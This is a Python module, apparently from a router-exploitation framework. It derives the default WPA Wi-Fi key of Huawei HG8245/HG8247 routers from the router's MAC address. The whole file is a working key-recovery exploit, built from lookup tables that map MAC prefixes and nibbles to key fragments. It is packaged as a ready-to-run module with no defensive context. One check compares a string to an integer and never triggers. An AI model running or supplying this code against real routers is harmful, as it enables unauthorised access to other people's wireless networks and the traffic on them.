# coding=utf-8
from lib.interfaces.iexploit import IExploit


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name = " Generates WPA key",
            category = "generator",
            authors = "Ján Trenčanský",
            date = "18/07/2015",
            cwe = "CWE-310: Cryptographic Issues",
            description = "Generates WPA key for Huawei HG8245/HG8247 based on mac. Based on: function HG824x() routerpwn.com"
        )

    def run(self, mac):
        mac = mac.upper()
        mac = mac.replace("-", ":")
        mac = mac.split(":")

        last = mac[0]
        part1 = mac[3]
        part2 = mac[4]
        partx = mac[5]
        part3 = mac[5][0]
        offset = mac[5][1]
        integer = int(offset, 16)
        value = int(part3, 16)

        if (0 <= integer <= 8) and (value != 0):
            value -= 1

        val = format(value, 'x')
        val = val.upper()

        if offset == "8":
            part3 = "F"
        elif offset == "C":
            part3 = "3"
        elif offset == "0":
            part3 = "7"
        elif offset == "4":
            part3 = "B"
        elif offset == "9":
            part3 = "0"
        elif offset == "D":
            part3 = "4"
        elif offset == "1":
            part3 = "8"
        elif offset == "5":
            part3 = "C"
        elif offset == "A":
            part3 = "1"
        elif offset == "E":
            part3 = "5"
        elif offset == "2":
            part3 = "9"
        elif offset == "6":
            part3 = "D"
        elif offset == "B":
            part3 = "2"
        elif offset == "F":
            part3 = "6"
        elif offset == "3":
            part3 = "A"
        elif offset == "7":
            part3 = "E"

        if last == "28":
            part4 = "03"
        elif last == "00":
            part4 = "0D"
        elif last == "AC":
            part4 = "1A"
        elif last == "08":
            part4 = "05"
        elif last == "10":
            part4 = "0E"
        elif last == "20":
            part4 = "1F"
        elif last == "80":
            part4 = "06"
        elif last == "CC":
            part4 = "12"
        elif last == "70":
            part4 = "20"
        elif last == "E0":
            part4 = "0C"
        elif last == "D4":
            part4 = "35"
        elif last == "F8":
            part4 = "21"
        elif last == "48":
            part4 = "24"
        else:
            return None

        integer = int(partx, 16)
        if 0 <= integer <= 8:
            new_v = int(part2, 16)
            new_value = new_v - 1
            part2 = format(new_value, 'x')
            part2 = part2.upper()

            if val == 0:
                val = "F"

        data = part1 + part2 + val + part3 + part4

        return data
